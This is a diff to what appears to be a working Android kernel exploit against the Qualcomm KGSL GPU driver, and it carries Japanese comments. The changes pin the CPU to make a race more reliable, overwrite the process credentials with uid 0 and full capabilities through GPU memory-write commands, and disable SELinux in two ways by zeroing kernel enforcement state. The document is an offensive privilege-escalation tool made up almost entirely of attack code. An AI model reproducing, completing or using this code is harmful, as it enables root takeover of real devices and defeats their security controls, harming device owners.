@@ -111,6 +111,12 @@ static void *race_thread(void *arg) {
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
+    // CPU affinity for stable race
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(0, &cpuset);
+    sched_setaffinity(0, sizeof(cpuset), &cpuset);
+
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
@@ -268,30 +274,34 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    printf("[*] Phase 7: Overwrite cred with init_cred (uid=0, caps)\n");
+    printf("[*] Phase 7: Overwrite cred fields (uid=0, caps=full)\n");
     for (int p = 0; p < n_cred && p < 32; p++) {
         uint64_t cbase = cred_pages[p] + cred_offs[p];
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
         memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < 0x100/4; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i*4, &dl, &dh);
-            split64(init_cred_addr + i*4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
+
+        // uid, gid, euid, egid, suid, sgid, fsuid, fsgid を 0 に
+        uint64_t uid_base = cbase + 0x04;
+        for (int i = 0; i < 8; i++) {
+            uint32_t al, ah;
+            split64(uid_base + i * 4, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+            cmd[dw++] = al; cmd[dw++] = ah;
+            cmd[dw++] = 0;
         }
-        for (int i = 0; i < 0x100/4; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(cbase + i*4, &dl, &dh);
-            split64(dst_ga + i*4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
+
+        // capabilities (CapPrm, CapEff, CapInh, CapBnd) をフルに設定
+        uint64_t cap_base = cbase + 0x28;
+        for (int i = 0; i < 4; i++) {
+            uint32_t al, ah;
+            split64(cap_base + i * 8, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
+            cmd[dw++] = al; cmd[dw++] = ah;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
         }
+
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
@@ -301,25 +311,39 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite done\n");
 
-    printf("[*] Phase 8: Zero selinux_state (make SELinux permissive)\n");
+    // SELinux を確実に permissive にする (二重の手法)
+    printf("[*] Phase 8: Disable SELinux\n");
+
+    // 手法1: selinux_enforcing_boot を 0 に
+    {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        uint64_t enforcing_boot_addr = FIXED_SELINUX_ENFORCING_BOOT;
+        uint32_t al, ah;
+        split64(enforcing_boot_addr, &al, &ah);
+        cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+        cmd[dw++] = al; cmd[dw++] = ah;
+        cmd[dw++] = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx_id, ts);
+        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        printf("[+] selinux_enforcing_boot zeroed\n");
+    }
+
+    // 手法2: selinux_state の先頭 0x20 バイトをゼロクリア (保険)
     {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
         uint64_t selinux_state_addr = FIXED_SELINUX_STATE;
-        int offsets[] = {0x0, 0x4, 0x8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20};
-        for (int i = 0; i < sizeof(offsets)/sizeof(int); i++) {
-            uint64_t addr = selinux_state_addr + offsets[i];
-            uint32_t al, ah;
-            split64(addr, &al, &ah);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-            cmd[dw++] = al; cmd[dw++] = ah;
-            cmd[dw++] = 0;
-        }
-        uint64_t enforcing_boot = FIXED_ENFORCING_BOOT;
-        for (int i = 0; i < 4; i++) {
-            uint64_t addr = enforcing_boot + i;
+        for (int off = 0; off < 0x20; off += 4) {
+            uint64_t addr = selinux_state_addr + off;
             uint32_t al, ah;
             split64(addr, &al, &ah);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
@@ -332,7 +356,7 @@ int main(int argc, char **argv) {
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
         flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] selinux_state zeroed\n");
+        printf("[+] selinux_state zeroed (first 0x20 bytes)\n");
     }
 
     printf("[*] Phase 9: Cache eviction\n");
